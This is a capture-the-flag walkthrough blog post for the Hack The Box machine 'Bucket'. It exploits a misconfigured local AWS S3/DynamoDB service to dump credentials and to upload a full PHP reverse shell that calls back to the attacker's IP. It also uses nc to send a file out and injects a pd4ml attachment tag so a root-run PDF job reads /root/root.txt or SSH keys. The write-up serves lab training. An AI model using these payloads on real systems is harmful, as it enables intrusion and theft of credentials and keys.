---
layout: post
title: Bucket - Walkthrough
---

Bucket is one of my favorite box on Hackthebox! This machine forces you to understand every step that you make to get root. There is no easy trick, you just need to enumerate and read the doc to find the misconfiguration. Very nice one!

## Recon
As usual, I start with a quick Nmap followed by a full scan with the default script (-C) and the -V tag to get more info about the services.

{% highlight sh %}
sudo nmap bucket && sudo nmap -sCV -p- bucket -oN nmap
{% endhighlight %}

{% highlight text %}
# Nmap 7.91 scan initiated Thu Oct 22 07:11:10 2020 as: nmap -sC -sV -oN nmap -p- bucket
Nmap scan report for bucket (10.10.10.212)
Host is up (0.11s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 22 07:24:17 2020 -- 1 IP address (1 host up) scanned in 786.82 seconds

{% endhighlight %}

We have 2 ports open:
- SSH
- HTTP

Right away, we can notice that the domain name is `bucket.htb`. I'm gonna put that in my `/etc/hosts` file and then move on to the website (port 80). Also I'm gonna take a note of the <strong><cite>Apache</cite></strong> version (2.4.41).

## Foothold / User
The website is only one html page.

To get more information, I'm gonna use `nikto` and `gobuster` to target the page. Also I like to poke arround with <strong><cite>Firefox</cite></strong> to make a bit of manual enumeration. What I've noticed here is the path that is requested to get the images `http://s3.bucket.htb/adserver/images/`.

It seems like we have a subdomain called `s3`. Also from the box name and now the new subdomain, I guess it's pretty clear that we are dealing with <strong><cite>[AWS](https://aws.amazon.com/s3/)</cite></strong>.

> Amazon Simple Storage Service (Amazon S3) is an object storage service that offers industry-leading scalability, data availability, security, and performance. This means customers of all sizes and industries can use it to store and protect any amount of data for a range of use cases, such as data lakes, websites, mobile applications, backup and restore, archive, enterprise applications, IoT devices, and big data analytics. Amazon S3 provides easy-to-use management features so you can organize your data and configure finely-tuned access controls to meet your specific business, organizational, and compliance requirements. Amazon S3 is designed for 99.999999999% (11 9's) of durability, and stores data for millions of applications for companies all around the world.

Also, it's important to note that <strong><cite>AWS</cite></strong> uses [buckets](https://docs.aws.amazon.com/AmazonS3/latest/dev/UsingBucket.html) to store data in the cloud.
Thus, if somebody wants to store something into <strong><cite>Amazon S3</cite></strong>, then it needs to create a bucket first.

Apparently, this is the kind of architecture that we have here. 
A website on the `http://bucket.htb` getting assets from a bucket on the `http://s3.bucket.htb` subdomain. 

Now let's have a look at the bucket `http://s3.bucket.htb`.

We find this:

> {"status": "running"}

Not sure what it means right now but I'm gonna run `gobuster` to enumerate that folder. 

{% highlight sh %}
gobuster dir -u http://s3.bucket.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100
{% endhighlight %}
{% highlight text %}
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://s3.bucket.htb
[+] Threads:        100
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/15 08:23:55 Starting gobuster
===============================================================
/health (Status: 200)
/shell (Status: 200)
/server-status (Status: 403)

{% endhighlight %}

Great ! We got 3 new page to discover. 

- `server-status` reported a `403` code (forbidden) so I'm not gonna botter with that one. 
- `health` gave us a bit more informations about the services that are running on the box. 
	 > s3: "running"
	 > dynamodb: "running"
- `shell` redirect us to another domain on port `4566`. 
	 > http://444af250749d:4566/shell/
	
	If I add the new domain to my host file and retry to connect again, I get a `Connection reufsed` message so, I'm saving that for later because I want to know more about that `dynamodb` service. 
	
From the [Amazon Website](https://aws.amazon.com/dynamodb/)
> Amazon DynamoDB is a key-value and document database that delivers single-digit millisecond performance at any scale. It's a fully managed, multi-region, multi-active, durable database with built-in security, backup and restore, and in-memory caching for internet-scale applications. DynamoDB can handle more than 10 trillion requests per day and can support peaks of more than 20 million requests per second.

Now, how to enumerate that database ? 

After a bit of research, I've found that there is CLI tool from Amazon to interact with `bucket` but also with `dynamodb`. 

If you don't have the tool installed on your Kali box, you can just follow that [article](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html) to install it. 

To use that tool, I found out that the documentation is very well done. All you need to do is type that command and you'll get pretty much everything that you need to use that tool.

{% highlight sh %}
python2.7 /usr/bin/aws help
{% endhighlight %}

So, we want to focus on `dynamodb` and extract (if possible) some valuable informations. Hence, the basic command is : 

{% highlight sh %}
python2.7 /usr/bin/aws dynamodb help
{% endhighlight %}

Then I use that command to get a list of the tables inside the db. 

{% highlight sh %}
python2.7 /usr/bin/aws dynamodb list-tables --endpoint-url http://s3.bucket.htb --region us-east-1 --no-sign-request
{% endhighlight %}

Note here that the `--no-sign-request` forces the tool to connect without any creds. Also we use the `--endpoint-url` option because the database is not local, so, we need to specify where the tool should aim for it. 

So we got this:
{% highlight text %}
{
    "TableNames": [
        "users"
    ]
}
{% endhighlight %}

Now I want to dump the `users` table:

{% highlight sh %}
python2.7 /usr/bin/aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb --region us-east-1 --no-sign-request --output text --query "Items\[*\]"
{% endhighlight %}

{% highlight text %}
PASSWORD	Management@#1@#
USERNAME	Mgmt
PASSWORD	Welcome123!
USERNAME	Cloudadm
PASSWORD	n2vM-<_K_Q:.Aa2
USERNAME	Sysadm
{% endhighlight %}

And we got 3 credentials !

I tried to connect on `SSH` with these creds but it didn't work out ! Hence, I think we're not gonna have something more from that database, but it taught us something very interesting, which is that we have more privileges that we normally should have, so it might be interesting to poke with `s3` service.

I read the doc for a while and discovered that it is possible to upload files directly from the cli. Let's try that !

First, we should list objects inside the bucket.

{% highlight sh %}
python2.7 /usr/bin/aws s3api list-objects --endpoint-url http://s3.bucket.htb --region us-east-1 --no-sign-request --bucket adserver
{% endhighlight %}

The server responds with a `JSON` string.

> {
    "Contents": [
        {
            "LastModified": "2020-12-15T14:10:04.000Z", 
            "ETag": "\"25118cbb11c412f4b517249e6e877dc3\"", 
            "StorageClass": "STANDARD", 
            "Key": "images/bug.jpg", 
            "Owner": {
                "DisplayName": "webfile", 
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }, 
            "Size": 37840
        }, 
        {
            "LastModified": "2020-12-15T14:10:04.000Z", 
            "ETag": "\"4d7905acad5d78b01085e461f78eae43\"", 
            "StorageClass": "STANDARD", 
            "Key": "images/cloud.png", 
            "Owner": {
                "DisplayName": "webfile", 
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }, 
            "Size": 51485
        }, 
        {
            "LastModified": "2020-12-15T14:10:04.000Z", 
            "ETag": "\"b22715647e087104f6b1ff7c0ce0731c\"", 
            "StorageClass": "STANDARD", 
            "Key": "images/malware.png", 
            "Owner": {
                "DisplayName": "webfile", 
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }, 
            "Size": 16486
        }, 
        {
            "LastModified": "2020-12-15T14:10:04.000Z", 
            "ETag": "\"dadef349eabdda42a5ff5118a5b9c229\"", 
            "StorageClass": "STANDARD", 
            "Key": "index.html", 
            "Owner": {
                "DisplayName": "webfile", 
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }, 
            "Size": 5344
        }
    ]
}

Basicaly, we have 4 files.

- 3 images inside a folder called `images`
- 1 `index.html` file

Great, it confirms that we have access to the bucket. Now let's upload a file in the bucket. 

{% highlight sh %}
python2.7 /usr/bin/aws s3api put-object --region us-east-1 --no-sign-request --bucket adserver --key test.txt --endpoint-url http://s3.bucket.htb
{% endhighlight %}
{% highlight text %}
{
    "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\""
}
{% endhighlight %}

It seems like it worked and if I list the objects inside the bucket again. We know have a new entry for our file. 

{% highlight text %}
        {
            "LastModified": "2020-12-15T14:14:18.000Z", 
            "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\"", 
            "StorageClass": "STANDARD", 
            "Key": "test.txt", 
            "Owner": {
                "DisplayName": "webfile", 
                "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
            }, 
            "Size": 0
        }
{% endhighlight %}

Therefore, I should be able to access my file on the server right ? 

> http://bucket.htb/text.txt

Unfortunately, it have a `file not found` message. Which means that something is wrong here. 
It took me a while to realize it but the answer is pretty simple. I should've read the doc better because when we upload a file, we need to specify the `body` tag when we make the request. Otherwise, we create a blank file in the bucket. From the above output, you can notice that the size of the file is `0`. 

The right command is this one:

{% highlight sh %}
python2.7 /usr/bin/aws s3api put-object --region us-east-1 --no-sign-request --bucket adserver --key test.txt --endpoint-url http://s3.bucket.htb --body test.txt
{% endhighlight %}

No I can access my file on the server like this:

> http://bucket.htb/text.txt

Great, now all I need is to upload a reverse shell and connect to it. 

My reverse shell looks like this:

{% highlight text %}
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.10';  // CHANGE THIS
$port = 2222;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
{% endhighlight %}

Set up a `netcat` listener like this.

{% highlight sh %}
nc -lvnp 2222
{% endhighlight %}

Then upload the reverse shell to the bucket.

{% highlight sh %}
python2.7 /usr/bin/aws s3api put-object --region us-east-1 --no-sign-request --bucket adserver --key shell.php --endpoint-url http://s3.bucket.htb --body shell.php
{% endhighlight %}

And try to access it with `curl` or `firefox`.
Don't hesitate to spam `F5` to refresh the page because it takes a few seconds to (fake) sync. 

And we are in !

{% highlight text %}
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::2222
Ncat: Listening on 0.0.0.0:2222
Ncat: Connection from 10.10.10.212.
Ncat: Connection from 10.10.10.212:45104.
Linux bucket 5.4.0-48-generic #52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:27:02 up  1:28,  0 users,  load average: 0.03, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}

### User

A quick enum and we can realize that we have a user called `Roy`.

{% highlight sh %}
cat /etc/passwd
{% endhighlight %}
{% highlight text %}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
roy:x:1000:1000:,,,:/home/roy:/bin/bash
{% endhighlight %}

I tried to connect as `Roy` via ssh using the passwords that we got `dynamodb` users table. and boom, we are connected as Roy.

{% highlight sh %}
id
{% endhighlight %}
{% highlight text %}
uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
{% endhighlight %}

{% highlight sh %}
id
{% endhighlight %}

## Root

Before running any automated script, I like to look make a bit of manual enumerations. 
Executing `netstat` helps us to understand what's going on here. 

{% highlight sh %}
netstat -tulpn
{% endhighlight %}

{% highlight text %}
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44923         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -  
{% endhighlight %}

I tried to `curl` the port `8000` and I got an answer so, I'd like to see that in browser so I'm gonna redirect the port `8000` to my local box via `ssh`. This way I can have a look at that web page. 

It's website that seems to be 'Under Construction', but it says this:

> Bucket Application /> not finished yet

I continue to enumerate the box and quickly, by looking inside the `/var/www` folder, I can see that there are 2 folders. 

- html
- bucket-app

The `/var/www/html` folder is the website linked to the `bucket.htb` domain name. Nothing interesting here. 

On the other hand, the `/var/www/bucket-app` makes me curious. What does that app do exactly ? 

The `index.html` file has a few lines of php in it. 

{% highlight sh %}
head -n 30 /var/www/bucket-app/index.php
{% endhighlight %}

{% highlight text %}
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
	if($_POST["action"]==="get_alerts") {
		date_default_timezone_set('America/New_York');
		$client = new DynamoDbClient([
			'profile' => 'default',
			'region'  => 'us-east-1',
			'version' => 'latest',
			'endpoint' => 'http://localhost:4566'
		]);

		$iterator = $client->getIterator('Scan', array(
			'TableName' => 'alerts',
			'FilterExpression' => "title = :title",
			'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
		));

		foreach ($iterator as $item) {
			$name=rand(1,10000).'.html';
			file_put_contents('files/'.$name,$item["data"]);
		}
		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
	}
}
else
{
?>
{% endhighlight %}

The script is waiting for a `POST` request with a parameter named `action` with the value `get_alerts`. 

> if($_SERVER["REQUEST_METHOD"]==="POST") {
	if($_POST["action"]==="get_alerts") {

Then it makes a request on the port `4566` which is `dynamodb`. 

> $client = new DynamoDbClient([
			'profile' => 'default',
			'region'  => 'us-east-1',
			'version' => 'latest',
			'endpoint' => 'http://localhost:4566'
		]);

It tries to access a table named `alerts` and it's looking for a string value called `Ransomware` inside the column `title`.

> $iterator = $client->getIterator('Scan', array(
			'TableName' => 'alerts',
			'FilterExpression' => "title = :title",
			'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
		));

Then it iterates over each item and extract the value from the column `data`. Then creates an `.html` file inside of the `/var/www/bucket-app/files` folder for each record.

> 		foreach ($iterator as $item) {
			$name=rand(1,10000).'.html';
			file_put_contents('files/'.$name,$item["data"]);
		}

At last, it executes a command on the system to create a `/var/www/bucket-app/files/result.pdf` file using the `/var/www/bucket-app/pd4ml_demo.jar`. 

>		passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");



Remember, when we got the list of the tables via the AWS Cli tool, we only got one table (users), so, I'm a bit confuse, let's try to run that script by sending a request to that url and then we'll see what's happenning. 

{% highlight sh %}
curl -X POST  http://127.0.0.1:8000 -d 'action=get_alerts' -v
{% endhighlight %}
{% highlight text %}

Note: Unnecessary use of -X or --request, POST is already inferred.
\*   Trying 127.0.0.1:8000...
\* TCP_NODELAY set
\* Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0)
\> POST / HTTP/1.1
\> Host: 127.0.0.1:8000
\> User-Agent: curl/7.68.0
\> Accept: */*
\> Content-Length: 17
\> Content-Type: application/x-www-form-urlencoded
\> 
\* upload completely sent off: 17 out of 17 bytes
\* Mark bundle as not supporting multiuse
\* HTTP 1.0, assume close after body
\< HTTP/1.0 500 Internal Server Error
\< Date: Tue, 15 Dec 2020 16:10:46 GMT
\< Server: Apache/2.4.41 (Ubuntu)
\< Content-Length: 0
\< Connection: close
\< Content-Type: text/html; charset=UTF-8
\< 
\* Closing connection 0
{% endhighlight %}

I noticed this: 

> HTTP/1.0 500 Internal Server Error

As expected, the script doesn't work properly because it's looking for a table that doesn't exist. 

Remember that we have a lot of privileges on that `AWS S3` instance so, again, I read the documentation and it turns out that we can create new tables and records with a few commands. 

So, first I tried to create a new table called `alerts` via the cli tool and it worked !

{% highlight sh %}
python2.7 /usr/bin/aws dynamodb create-table 	--table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.bucket.htb --region us-east-1 --no-sign-request
{% endhighlight %}

Then, I tried to create a record in the table with the title `Ransomware` and the data `ThanksForReading`.

{% highlight sh %}
python2.7 /usr/bin/aws dynamodb put-item 		--table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "ThanksForReading"}}' --endpoint-url=http://s3.bucket.htb --region us-east-1 --no-sign-request
{% endhighlight %}

Again, it worked !

The only problem here is that the table is automaticaly removed after a few seconds so, I need to create a script to:

1. Create a table called `alerts`
2. Create a record 
3. Execute curl to trigger the scirpt inside the `backup-app`.

Here is my script:

> python2.7 /usr/bin/aws dynamodb create-table 	--table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.bucket.htb --region us-east-1 --no-sign-request
python2.7 /usr/bin/aws dynamodb put-item 		--table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "teststringalue"}}' --endpoint-url=http://s3.bucket.htb --region us-east-1 --no-sign-request
python2.7 /usr/bin/aws dynamodb list-tables --endpoint-url http://s3.bucket.htb --region us-east-1 --no-sign-request
python2.7 /usr/bin/aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb --region us-east-1 --no-sign-request --output text --query "Items[*]"
python2.7 /usr/bin/aws dynamodb scan --table-name alerts --endpoint-url http://s3.bucket.htb --region us-east-1 --no-sign-request --output text --query "Items[*]"
curl http://127.0.0.1:8000/index.php/ -X POST -d 'action=get_alerts' -v

I could've used <cite><strong>Python</strong></cite> to do that but I feel more comfortable with <cite><strong>Bash</strong></cite>. Also you can notice that I added a few commands just to list and dump tables. These steps are not necessary but I wanted to be sure that every worked fine and it's always nice to have a bit of feedback on what we did. 

I ran the script before and I realized that the files inside the `/var/www/backup-app/files` folders are automaticaly removed after a few seconds so, I suggest you to use `watch` to copy these files to a temp folder on the target machine. 

So, on the target machine I did this:

{% highlight sh %}
tmp=$(mktemp -d)
watch -d "ls -l /var/www/bucket-app/files | cp -r /var/www/bucket-app/files/* $tmp" 
{% endhighlight %}

Now, on my local machine, I can run the script that I created:

{% highlight sh %}
./script.sh
{% endhighlight %}

{% highlight text %}

An error occurred (ResourceInUseException) when calling the CreateTable operation: Table already created

Error parsing parameter '--item': Invalid JSON: Expecting object: line 1 column 63 (char 62)
JSON received: {"title": {"S": "Ransomware"}, "data": {"S": "teststringvalue"}
{
    "TableNames": [
        "alerts", 
        "users"
    ]
}
PASSWORD	Management@#1@#
USERNAME	Mgmt
PASSWORD	Welcome123!
USERNAME	Cloudadm
PASSWORD	n2vM-<_K_Q:.Aa2
USERNAME	Sysadm
R0cK@kali:~/htb/bucket$ ./script-v002.sh 
{
    "TableDescription": {
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts", 
        "AttributeDefinitions": [
            {
                "AttributeName": "title", 
                "AttributeType": "S"
            }
        ], 
        "ProvisionedThroughput": {
            "NumberOfDecreasesToday": 0, 
            "WriteCapacityUnits": 5, 
            "LastIncreaseDateTime": 0.0, 
            "ReadCapacityUnits": 10, 
            "LastDecreaseDateTime": 0.0
        }, 
        "TableSizeBytes": 0, 
        "TableName": "alerts", 
        "TableStatus": "ACTIVE", 
        "KeySchema": [
            {
                "KeyType": "HASH", 
                "AttributeName": "title"
            }
        ], 
        "ItemCount": 0, 
        "CreationDateTime": 1608049943.132
    }
}
{
    "ConsumedCapacity": {
        "CapacityUnits": 1.0, 
        "TableName": "alerts"
    }
}
{
    "TableNames": [
        "alerts", 
        "users"
    ]
}
PASSWORD	Management@#1@#
USERNAME	Mgmt
PASSWORD	Welcome123!
USERNAME	Cloudadm
PASSWORD	n2vM-<_K_Q:.Aa2
USERNAME	Sysadm
DATA	teststringalue
TITLE	Ransomware
R0cK@kali:~/htb/bucket$ ./script-v002.sh 
{
    "TableDescription": {
        "TableArn": "arn:aws:dynamodb:us-east-1:000000000000:table/alerts", 
        "AttributeDefinitions": [
            {
                "AttributeName": "title", 
                "AttributeType": "S"
            }
        ], 
        "ProvisionedThroughput": {
            "NumberOfDecreasesToday": 0, 
            "WriteCapacityUnits": 5, 
            "LastIncreaseDateTime": 0.0, 
            "ReadCapacityUnits": 10, 
            "LastDecreaseDateTime": 0.0
        }, 
        "TableSizeBytes": 0, 
        "TableName": "alerts", 
        "TableStatus": "ACTIVE", 
        "KeySchema": [
            {
                "KeyType": "HASH", 
                "AttributeName": "title"
            }
        ], 
        "ItemCount": 0, 
        "CreationDateTime": 1608050385.625
    }
}
{
    "ConsumedCapacity": {
        "CapacityUnits": 1.0, 
        "TableName": "alerts"
    }
}
{
    "TableNames": [
        "alerts", 
        "users"
    ]
}
PASSWORD	Management@#1@#
USERNAME	Mgmt
PASSWORD	Welcome123!
USERNAME	Cloudadm
PASSWORD	n2vM-<_K_Q:.Aa2
USERNAME	Sysadm
DATA	teststringalue
TITLE	Ransomware
Note: Unnecessary use of -X or --request, POST is already inferred.
\*   Trying 127.0.0.1:8000...
\* Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0)
\> POST /index.php/ HTTP/1.1
\> Host: 127.0.0.1:8000
\> User-Agent: curl/7.72.0
\> Accept: */*
\> Content-Length: 17
\> Content-Type: application/x-www-form-urlencoded
\> 
\* upload completely sent off: 17 out of 17 bytes
\* Mark bundle as not supporting multiuse
\< HTTP/1.1 200 OK
\< Date: Tue, 15 Dec 2020 16:39:56 GMT
\< Server: Apache/2.4.41 (Ubuntu)
\< Content-Length: 0
\< Content-Type: text/html; charset=UTF-8
\< 
\* Connection #0 to host 127.0.0.1 left intact

{% endhighlight %}

As you can see, we now have a code `200` from the `curl` output, which sounds good. Now let's have a look at our `tmp` folder on the target machine. 

{% highlight sh %}
ls -l $tmp
{% endhighlight %}

{% highlight text %}
-rw-r--r-- 1 roy roy   14 Dec 15 16:40 822.html
-rw-r--r-- 1 roy roy 1634 Dec 15 16:40 result.pdf
{% endhighlight %}

Let's download the `result.pdf` file on our box. 

On the target:
{% highlight sh %}
nc 10.10.14.10 3333 < $tmp/result.pdf
{% endhighlight %}

On my local machine:
{% highlight sh %}
nc -lvnp 3333 > result.pdf
{% endhighlight %}

Now we can open that `pdf` and voila, we have our value `ThanksForReading` inside the pdf.

To summarize, we now have an app running as root that can create `pdf` files on the system. Because we can create tables and values inside the database, then we can control what's inside the `pdf` files. Now, we are looking for a way to execute a command or gather the root flag. 

I've found a nice article about [pd4ml](https://medium.com/bugbountywriteup/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd).

In the article, it used the `attachment` capability of the `pd4ml` module to read files on the system. Maybe it could be a way to go.  

> <pd4ml:attachment src=”file:///etc/passwd”><pd4ml:attachment>

I made more tests, read the doc and I came out with that command:

> <pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/root.txt</pd4ml:attachment>

All we need to do is replace the `ThanksForReading` value inside our script by the line above.

So, here is my final script.

> python2.7 /usr/bin/aws dynamodb create-table 	--table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.bucket.htb --region us-east-1 --no-sign-request
python2.7 /usr/bin/aws dynamodb put-item 		--table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/root.txt</pd4ml:attachment>"}}' --endpoint-url=http://s3.bucket.htb --region us-east-1 --no-sign-request
curl http://127.0.0.1:8000/index.php/ -X POST -d 'action=get_alerts' -v

Don't forget to use `watch` before running the script. 

{% highlight sh %}
watch -d "ls -l /var/www/bucket-app/files | cp -r /var/www/bucket-app/files/* $tmp" 
{% endhighlight %}

{% highlight sh %}
cat $tmp/result.pdf
{% endhighlight %}

The root flag is inside the output but you can also download the `pdf` file as we did above and open the attachment manually. 
You can also replace the `/root/root.txt` by `/root/.ssh/id_rsa` to get the ssh private key. 

<strong>Rooted ;)</strong>
